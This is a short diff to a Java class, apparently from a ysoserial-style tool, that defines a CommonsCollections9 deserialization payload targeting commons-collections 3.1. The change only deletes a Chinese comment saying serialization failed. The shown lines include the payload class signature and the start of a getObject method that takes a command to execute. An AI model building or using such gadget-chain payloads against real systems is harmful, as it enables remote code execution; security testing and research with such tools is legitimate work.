@@ -17,7 +17,7 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<Serializable> {
-    //    序列化就报错，未成功
+
     @Override
     public BadAttributeValueExpException getObject(String command) throws Exception {
         final String[] execArgs = new String[]{command};
